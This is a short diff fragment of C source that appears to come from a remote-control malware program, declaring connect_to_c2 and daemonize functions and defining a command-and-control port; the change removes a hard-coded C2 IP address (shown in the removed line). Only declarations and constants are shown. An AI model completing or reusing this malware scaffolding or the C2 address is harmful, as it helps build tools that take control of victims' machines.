@@ -68,7 +68,7 @@
  void connect_to_c2(void);
  void daemonize(void);
  
- #define C2_SERVER "51.68.128.169"
+ #define C2_SERVER ""
  #define C2_PORT 1337
  #define BUFFER_SIZE 1024
  #define CMD_SIZE 512
